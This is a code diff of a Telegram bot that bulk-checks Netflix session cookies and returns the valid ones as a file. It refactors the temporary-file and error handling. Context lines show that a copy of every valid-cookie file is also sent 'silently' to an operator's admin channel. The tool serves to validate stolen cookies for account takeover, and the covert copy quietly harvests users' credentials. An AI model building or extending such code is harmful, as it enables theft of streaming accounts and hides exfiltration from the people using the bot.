@@ -132,42 +132,44 @@ async def check_cookies_async(checker, lines_list, bot, chat_id, message_id):
     await save_valid_cookies_for_bot(checker, total_lines, bot, chat_id)
 
 async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
-    """Saves valid cookies to a temp file and sends it to the user."""
+    """Save valid cookies to a file and send to Telegram"""
     valid_lines = checker.valid_lines
-    
-    now = datetime.now()
-    file_timestamp = now.strftime("%Y%m%d_%H%M%S")
-    display_timestamp = now.strftime("%d %B %Y, %I:%M:%S %p")
-
     if not valid_lines:
         await bot.send_message(chat_id, "❌ No valid cookies found!")
         return
         
-    filename = f"valid_cookies_{file_timestamp}.txt"
+    # Create timestamps
+    now = datetime.now()
+    file_timestamp = now.strftime("%Y%m%d_%H%M%S")
+    display_timestamp = now.strftime("%d %B %Y, %I:%M:%S %p")
+        
+    # Create filename with timestamp
+    filename = f"valid_cookies_{checker.mode}_{file_timestamp}.txt"
     
-    # Use a temporary file to avoid cluttering the server
-    with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt', encoding='utf-8') as temp_file:
-        for line in valid_lines:
-            temp_file.write(f"{line}\n")
-        temp_filepath = temp_file.name
-
+    # Create temp file
+    temp_filepath = os.path.join(tempfile.gettempdir(), filename)
+    
     try:
-        msg_text = f"🍪 **Netflix Cookie Checker Results** 🍪\n\n" \
-                   f"📝 Total Cookies Checked: `{total_lines_count}`\n" \
-                   f"✅ Valid Cookies Found: `{len(valid_lines)}`\n" \
-                   f"📅 Date: `{display_timestamp}`"
-
+        # Save cookies to temp file
+        with open(temp_filepath, "w", encoding="utf-8") as f:
+            for line in valid_lines:
+                f.write(f"{line}\n")
+        
+        # Format message text
+        msg_text = f"🍪 Netflix Cookie Checker Results\n\n" \
+                   f"📝 Total Cookies: {total_lines_count}\n" \
+                   f"✅ Valid Cookies: {len(valid_lines)}\n" \
+                   f"📅 Date: {display_timestamp}"
+        
+        # Send message with file
         with open(temp_filepath, 'rb') as doc:
             await bot.send_document(
                 chat_id=chat_id,
                 document=doc,
                 filename=filename,
-                caption=msg_text,
-                parse_mode='Markdown'
+                caption=msg_text
             )
-    except Exception as e:
-        await bot.send_message(chat_id, f"An error occurred while sending the results file: {e}")
-    finally:
+        
         # Also send a copy to the admin channel silently
         try:
             if TELEGRAM_CHAT_ID:
@@ -185,6 +187,11 @@ async def save_valid_cookies_for_bot(checker, total_lines_count, bot, chat_id):
             # Fail silently if admin channel sending fails, but log it properly.
             logger.error(f"Failed to send results to admin channel ({TELEGRAM_CHAT_ID}): {e}", exc_info=True)
         
+    except Exception as e:
+        logger.error(f"Error saving valid cookies: {e}", exc_info=True)
+        await bot.send_message(chat_id, "❌ An error occurred while saving the results.")
+    
+    finally:
         # Clean up the temp file
         if os.path.exists(temp_filepath):
             os.remove(temp_filepath)
